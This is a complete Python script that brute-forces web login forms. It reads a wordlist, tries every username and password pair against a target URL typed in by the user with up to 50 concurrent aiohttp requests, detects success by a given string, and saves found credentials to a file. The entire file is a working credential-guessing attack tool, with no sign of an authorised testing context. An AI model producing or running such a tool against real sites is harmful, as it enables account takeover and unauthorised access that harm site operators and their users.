import asyncio
import aiohttp
from itertools import product
from tqdm import tqdm

async def attempt_login(session, url, username, password, success_string, semaphore):
    async with semaphore:
        data = {'username': username, 'password': password}
        async with session.post(url, data=data) as response:
            if response.status == 200:  # Assuming successful login returns 200 OK
                text = await response.text()
                if success_string in text:
                    return f"Found credentials: {username}:{password}"
    return None

async def brute_force(url, wordlist, success_string, max_concurrent_requests=50):
    usernames, passwords = [], []
    try:
        with open(wordlist, 'r') as file:
            lines = [line.strip() for line in file]
            usernames = passwords = lines  # Assuming same list for both if not specified otherwise
    except FileNotFoundError:
        print(f"Wordlist file not found: {wordlist}")
        return

    semaphore = asyncio.Semaphore(max_concurrent_requests)
    async with aiohttp.ClientSession() as session:
        tasks = []
        for username, password in product(usernames, passwords):
            tasks.append(attempt_login(session, url, username, password, success_string, semaphore))

        results = []
        for result in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc="Brute-forcing"):
            outcome = await result
            if outcome:
                results.append(outcome)
                print(outcome)
                # Optionally, you can break here if you want to stop on first success
                # break

    return results

if __name__ == "__main__":
    import sys

    url = input("Enter target URL: ")
    wordlist = input("Enter wordlist path: ")
    success_string = input("Enter string indicating successful login: ")

    loop = asyncio.get_event_loop()
    results = loop.run_until_complete(brute_force(url, wordlist, success_string))

    with open('results.txt', 'w') as f:
        for result in results:
            f.write(result + '\n')
    print(f"Results written to results.txt")